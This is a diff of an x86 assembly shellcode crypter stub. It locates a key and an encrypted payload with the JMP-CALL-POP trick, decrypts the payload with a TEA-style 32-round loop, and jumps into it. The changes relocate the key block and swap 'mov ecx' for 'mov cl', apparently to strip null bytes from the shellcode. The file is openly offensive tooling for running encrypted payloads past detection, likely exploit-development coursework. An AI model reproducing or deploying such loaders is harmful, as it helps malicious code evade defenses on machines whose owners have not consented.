@@ -14,28 +14,18 @@ section .text
 _start:
 	jmp short key_section				; goto key_section
 
-key_section:
-	; key0: 0x6c645a37
-	; key1: 0x6e775667
-	; key2: 0x57433641
-	; key3: 0x4e6c7151
-	call key_loader					; goto key_loader, putting key on the stack
-	;       |          0          |            1           |           2          |            3           |
-	;       |         EDI         |          EDI+4         |         EDI+8        |          EDI+12        |
-	key: db 0x6c, 0x64, 0x5a, 0x37, 0x6e, 0x77, 0x56, 0x67, 0x57, 0x43, 0x36, 0x41, 0x4e, 0x6c, 0x71, 0x51
-
 key_loader:
 	pop edi								; load address of our key into EDI (JMP CALL POP trick)
 	jmp short shellcode_section			; goto shellcode_section
 
 decoder:								; decoder
 	pop esi								; load address of our encrypted_shellcode into ESI (JMP CALL POP trick)
-	mov ecx, 3							; load the number of our shellcode chunks, used to loop. (shellcode length is 24. 24/4(DWORD)=6 blocks/2(chunks taken 2by 2)=3)
+	mov cl, 3							; load the number of our shellcode chunks, used to loop. (shellcode length is 24. 24/4(DWORD)=6 blocks/2(chunks taken 2by 2)=3)
 	;cld								; clear direction flag
 
 decrypt_loop:
 	push ecx							; save counter status before entering 32 iteration loop
-    mov ecx, 32							; store loop counter, we nedd to cycle x32 times
+    mov cl, 32							; store loop counter, we nedd to cycle x32 times
 	mov edx, 0xC6EF3720					; EDX = sum
 	loop_32:
 		mov ebx, dword [esi]			; v0 load encrypted_shellcode's chunk DWORD pointed by ESI in EBX | EBX=A
@@ -86,6 +76,16 @@ decrypt_loop:
     exec:
 	int3								; GDB: x/24cb encrypted_shellcode
 	jmp short encrypted_shellcode		; ECX is 0! We've decrypted our shellcode and we can now directly jump into it
+	
+key_section:
+	; key0: 0x6c645a37
+	; key1: 0x6e775667
+	; key2: 0x57433641
+	; key3: 0x4e6c7151
+	call key_loader					; goto key_loader, putting key on the stack
+	;       |          0          |            1           |           2          |            3           |
+	;       |         EDI         |          EDI+4         |         EDI+8        |          EDI+12        |
+	key: db 0x6c, 0x64, 0x5a, 0x37, 0x6e, 0x77, 0x56, 0x67, 0x57, 0x43, 0x36, 0x41, 0x4e, 0x6c, 0x71, 0x51
 
 shellcode_section:
         call decoder					; goto decoder, putting encrypted_shellcode on the stack
